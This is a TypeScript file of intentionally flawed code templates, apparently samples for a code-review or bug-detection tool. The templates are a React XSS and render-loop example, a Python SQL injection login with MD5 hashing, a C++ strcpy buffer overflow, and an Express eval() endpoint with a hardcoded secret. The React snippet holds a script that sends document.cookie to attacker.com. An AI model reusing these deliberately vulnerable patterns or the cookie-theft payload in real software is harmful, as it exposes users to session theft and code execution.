export interface CodeTemplate {
  name: string;
  language: string;
  filename: string;
  description: string;
  code: string;
}

export const CODE_TEMPLATES: CodeTemplate[] = [
  {
    name: "React State Bug & Memory Leak",
    language: "typescript",
    filename: "Dashboard.tsx",
    description: "An infinite render loop, memory leak on interval timers, and unescaped HTML content insertion.",
    code: `import React, { useState, useEffect } from 'react';

export default function Dashboard() {
  const [data, setData] = useState([]);
  const [userId, setUserId] = useState("usr_live_9a2b8ff8310c"); // WARNING: Live key
  const [ticker, setTicker] = useState(0);

  // BUG: Infinite re-render loop
  useEffect(() => {
    fetch('/api/stats/' + userId)
      .then(res => res.json())
      .then(resData => setData(resData));
  }, [data]); // Triggered on every state change of 'data'

  // PERFORMANCE: Uncleaned timer (Memory Leak)
  useEffect(() => {
    setInterval(() => {
      setTicker(t => t + 1);
    }, 1000);
  }, []);

  // SECURITY: XSS injection vector
  const htmlContent = "<script>fetch('http://attacker.com/steal?cookies=' + document.cookie)</script>";

  return (
    <div className="p-4">
      <h1 className="text-xl">Admin Dashboard</h1>
      <p>Session active: {ticker} seconds</p>
      
      {/* Risk: Arbitrary script injection */}
      <div dangerouslySetInnerHTML={{ __html: htmlContent }} />

      <div className="mt-4">
        {data.map((item: any) => (
          <div key={item.id}>{item.name}</div>
        ))}
      </div>
    </div>
  );
}`
  },
  {
    name: "Python SQL Injection & Hashing vulnerability",
    language: "python",
    filename: "auth.py",
    description: "SQL injection via raw string interpolation and using weak MD5 hashing for passwords.",
    code: `import sqlite3
import hashlib

def login_user(username, password):
    # SECURITY: SQL Injection vulnerability via raw formatting
    connection = sqlite3.connect("users.db")
    cursor = connection.cursor()
    
    query = "SELECT * FROM accounts WHERE user = '%s' AND pwd_hash = '%s'" % (
        username, 
        hashlib.md5(password.encode()).hexdigest() # SECURITY: Broken MD5 cryptography
    )
    
    cursor.execute(query)
    user_record = cursor.fetchone()
    
    # BUG: Forgot to close SQLite database connection (connection leak)
    return user_record

def process_file(filepath):
    # PERFORMANCE: File opened without context-manager (risk of descriptor leaks)
    f = open(filepath, 'r')
    contents = f.read()
    # If parsing raises an exception, the file remains open indefinitely
    print("Parsed: " + str(len(contents)) + " chars")
    f.close()
    return contents`
  },
  {
    name: "C++ Memory Leak & Buffer Overflow",
    language: "cpp",
    filename: "buffer.cpp",
    description: "Traditional buffer overflow via unsafe string copying and memory leaks due to missing deallocations.",
    code: `#include <iostream>
#include <cstring>

void processInput(const char* userInput) {
    char localBuffer[16];
    
    // SECURITY: Severe stack-based buffer overflow via strcpy
    strcpy(localBuffer, userInput);
    
    std::cout << "Buffer content: " << localBuffer << std::endl;
}

int main() {
    // BUG & PERFORMANCE: Heap memory allocated but never freed (leak)
    int* dataArray = new int[1000];
    for (int i = 0; i < 1000; i++) {
        dataArray[i] = i * 2;
    }
    
    const char* badInput = "This string is much longer than sixteen characters!";
    processInput(badInput);
    
    // std::cout << dataArray[500] << std::endl;
    // Missing: delete[] dataArray;
    return 0;
}`
  },
  {
    name: "Insecure Node API Integration",
    language: "javascript",
    filename: "api.js",
    description: "Eval dynamic code, hardcoded API secret key, and unhandled Promise rejection.",
    code: `const express = require('express');
const app = express();

const JWT_SECRET = "sk_prod_991823abf8190013bbf992e"; // SECURITY: Embedded Secret

app.get('/evaluate', (req, res) => {
    const formula = req.query.formula;
    
    try {
        // SECURITY: Execution of untrusted code via eval()
        const result = eval(formula);
        res.json({ success: true, answer: result });
    } catch (err) {
        // BUG: Leaking raw execution errors directly to the client
        res.status(500).json({ error: err.message, stack: err.stack });
    }
});

app.get('/user-details', (req, res) => {
    // BUG: Unhandled Promise Rejection (express will crash if fetch fails)
    fetchUserFromDB(req.query.id).then(user => {
        res.json(user);
    });
    // Missing .catch() handle
});

function fetchUserFromDB(id) {
    return Promise.resolve({ id, name: "Developer" });
}`
  }
];
